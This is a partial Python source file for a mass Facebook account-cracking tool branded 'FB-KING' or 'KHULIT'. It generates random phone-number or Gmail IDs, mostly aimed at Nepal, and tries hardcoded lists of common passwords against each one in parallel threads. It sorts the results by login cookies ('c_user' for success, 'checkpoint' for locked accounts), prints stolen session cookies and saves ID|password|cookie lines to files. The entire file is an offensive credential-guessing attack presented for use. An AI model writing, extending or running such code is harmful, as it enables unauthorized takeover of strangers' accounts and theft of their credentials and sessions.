###----------[ IMPORT MODULE ]----------###
from os import path
from os import system as Love_khulit
...
def mainx():
    ...
    if mahin in ["1","01"]:
     ...
     os.system("xdg-open https://github.com/wangtengithub");mainx()
    elif mahin in ["8","08"]:
     os.system("xdg-open https://www.facebook.com/wangtenhere?mibextid=ZbWKwL");mainx()
    elif mahin in ["0","00"]:
     print(f'{gen}{RED}Exited {H}FB-KING {P}Terminal ')
    else:
     print(f"{dot}{M}Don't Select Wrong Options ");os.system("xdg-open https://www.facebook.com/wangtenhere?mibextid=ZbWKwL");mainx()
def mainx2():
    os.system("clear")
    banner()
    print(f"{K} [{H}1{K}] {WHITE}Random Cloning {H}Nepal")
...
def sep():
    ...
    print(led);print(f'{dot}Total File Ids {M}:{H} ' +
          str(len(open(file_name).read().splitlines())));print(led);print(f'{gen}Example {M}:{H} /sdcard/Wangten.txt');print(led)
...
def dupcutter():
    os.system('clear');banner();print(f'{dot}Example   {RED}:{H} /sdcard/Wangten.txt');print(led)
    Error = input(f"{wt}{N}File Name {RED}:{H} ");print(led);print(f'{dot}Example   {RED}:{H} /sdcard/Wangten.txt');print(led)
...
def gf1(): 
    ...
    input('Press Enter To Go Menu');os.system('python KHULIT.py')
def gf2(): 
    idf=[]
    os.system('clear');banner();print(fst);print(led)
    first = input(f'{dot}First Name {M}: {H}');print(led);print(lst);print(led)
    ...
    for nmbr in range(limit):
        ...
        idf.append(nmp)
    with tred(max_workers=40) as khulit_xd:
        os.system('clear')
        idx = str(len(idf))
        tk = first+last
        os.system("clear");banner();print(f'{dot}Method    {RED}:{H} M-{mthd}-P-Auto');print(f'{dot}Gmail ids {RED}:{H} {tk[:4]}****{domain}');print(f'{dot}Total Ids {RED}: {H}'+idx);print(led)
        for number in idf:
            ...
            if mthd in ['1','01']: khulit_xd.submit(m1,idf,pwv)
            elif mthd in ['2','02']:khulitxd.submit(m2,idf,pwv)
            elif mthd in ['3','03']:khulit_xd.submit(m3,idf,pwv)
            elif mthd in ['4','04']:khulit_xd.submit(m4,idf,pwv)
            elif mthd in ['5','05']:khulit_xd.submit(f1,idf,pwv)
            elif mthd in ['6','06']: khulit_xd.submit(f1,idf,pwv)
            else:
               khulit_xd.submit(m5,idf,pwv)
    print('');print(f'{N} Hi Dear User Crack process has been completed');print(f' {P}Total ok : {H}'+(ok)) #;print(f' {P}Total cp : {K}'+str(len(cp)));print('')
    input('Press Enter To Go Menu');os.system('python KHULIT.py')
...
def np():
  ...
  for nmbr in range(limit):
    ...
    user.append(nmp)
  with tred(max_workers=30) as khulit_xd:
    os.system('clear')
    tl = str(len(user))
    banner();print(f'{dot}Method{RED} : {H}M-'+hc);print(f'{dot}Number{RED} : {H}{kode}');print(f'{dot}Limit {RED} : {H}{tl}');print(led)
    for guru in user:
      idf = kode+guru
      pwv = [guru,'nepal12','nepal123','nepal1234','nepal12345','kathmandu','lama123','lama@123','gurung','gurung123','gurung12345','gurung@123','magar','magar123','magar12345','magar@123','tamang123','tamang@123','tamang12345','tamang@00','pokhara@123','lumbini','surkhet','iloveyou','loveyou','iloveyou321','iloveyou123','freefire','freefire123','freefire@123','freefire@321','freefire123','bibek123','bibek321','shahi123','shahi@123','shahi@321','shahi@@123','shahi@00','qwerty','qwerty123','1234567890']
      if 'm1' in mtd:khulit_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:khulit_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd:khulit_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:khulit_xd.submit(m4,idf,pwv)
      elif 'a1' in mtd:khulit_xd.submit(f1,idf,pwv)
      elif 'f1' in mtd:khulit_xd.submit(f1,idf,pwv)
      else:
       khulit_xd.submit(m5,idf,pwv)
  print('');print(f'{N} Hi Dear User Crack process has been completed')
  input(f'{dot}Press Enter To Go Menu');os.system('python khulit.py')
def xp():
  user=[]
  os.system('clear');banner();print(c7);print(led)
  kode = input(f'{dot}Select Code {M}: {H}');print(led);print(limitt);print(led)
  ...
  with tred(max_workers=30) as khulit_xd:
    ...
    for guru in user:
      idf = kode+guru
      pwv = [guru,'bossboss','boss boss','boss123','boss12','boss1122']
      if 'm1' in mtd:khulit_xd.submit(f1,idf,pwv)
      elif 'm2' in mtd:khulit_xd.submit(m2,idf,pwv)
      elif 'm3' in mtd: khulit_xd.submit(m3,idf,pwv)
      elif 'm4' in mtd:khulit_xd.submit(m4,idf,pwv)
...
def m1(idf,pwv):
    global loop, ok, cp
    animasi = random.choice(["\x1b[1;91mHULIT","\x1b[1;92mKHULIT","\x1b[1;93mKHULIT","\x1b[1;94mKHULIT","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT","\x1b[1;97mKHULIT","\x1b[1;91mKHULIT","\x1b[1;92mKHULIT","\x1b[1;93mKHULIT","\x1b[1;94mKHULIT","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT"])
        ...
        try:
           ...
           'sec-ch-ua-mobile': '?0'})
            ...
            if "checkpoint" in session.cookies.get_dict().keys():
             ...
             cp+=1
             if 'y' in cp_xdx:
              print(f'\r{P} [\033[1;30mTATI-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
             open(' /sdcard/TATI-CP.txt', 'a').write(idf+'|'+pw)
             cp.append(idf)
             break
                ...
                ok+=1
                print(f'\r{P} [{H} KHULIT-OK{P}] {GREEN}{idf}|{pw}{xxx}')
                if 'y' in cokix:
                 print(f'\r{gen}{H}'+kukis)
                open(' /sdcard/KHULIT-OK.txt', 'a').write(idf+'|'+pw)
                ok.append(idf+'|'+pw)
                break
            else:
                continue
...
def m2(idf,pwv):
 global loop,ok,cp
 animasi = random.choice(["\x1b[1;91mKHULIT","\x1b[1;92mKHULIT","\x1b[1;93mKHULIT","\x1b[1;94mKHULIT","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT","\x1b[1;97mKHULIT","\x1b[1;91mKHULIT","\x1b[1;92mKHULIT","\x1b[1;93mKHULIT","\x1b[1;94mKHULIT","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT"])
...
def m4(idx,pwv):
 ...
 # gif = random.choice(["\x1b[1;91m•    ","\x1b[1;92m••   ","\x1b[1;93m•••  ","\x1b[1;94m•••• ","\x1b[1;95m•••••"])
  animasi = random.choice(["\x1b[1;91mKING","\x1b[1;92mKING","\x1b[1;93mKING","\x1b[1;94mKING","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT","\x1b[1;97mKHULIT","\x1b[1;91mKHULIT","\x1b[1;92mKHULIT","\x1b[1;93mKHULIT","\x1b[1;94mKHULIT","\x1b[1;95mKHULIT","\x1b[1;96mKHULIT"])
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        ...
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mTATI-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/TATI-CP.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
        ok+=1
        ...
        if 'y' in cokix:
         print(f'\r{gen}{H}'+kuki)
        open(' /sdcard/KHULIT-OK.txt','a').write(idf+'|'+pw+'|'+kuki+'\n')
        break
  ...
  for pw in pwv:
    try:
      ...
      if "checkpoint" in po.cookies.get_dict().keys():
        idf = ses.cookies.get_dict()["checkpoint"].split("%")[4].replace("3A", "")
        if 'y' in cp_xdx:
         print(f'\r{P} [\033[1;30mTSTI-CP{P}] \033[1;30m{idf}|{pw}{xxx}')
        open(' /sdcard/TATI CP.txt','a').write(idf+'|'+pw+'|'+'\n')
        cp+=1
        break
      elif "c_user" in ses.cookies.get_dict().keys():
 ...
 try:
  for ps in pw:
   ...
   if 'c_user' in log_cookies:
    ...
    print('\r\033[1;32m [KHULIT-OK] '+user+'|'+ps) #+'--'+coki)
    if 'y' in cokix:
     print(f'\r{gen}{H}'+coki)
    ok+=1 
    open(' /sdcard/KHULIT-OK.txt','a').write(user+'|'+ps+'|'+'\n')
    ok.append(user)
    break
    ...
    uid = "1000"+coki1[0:11]
    if 'y' in cp_xdx:
     print(f'\r{P} [\033[1;30mTATI-CP{P}] \033[1;30m{idf}|{ps}{xxx}')
    open(' /sdcard/TATI-CP.txt','a').write(idf+'|'+ps+'|'+'\n')
    cp.append(idf)
   else:
    continue
  loop+=1
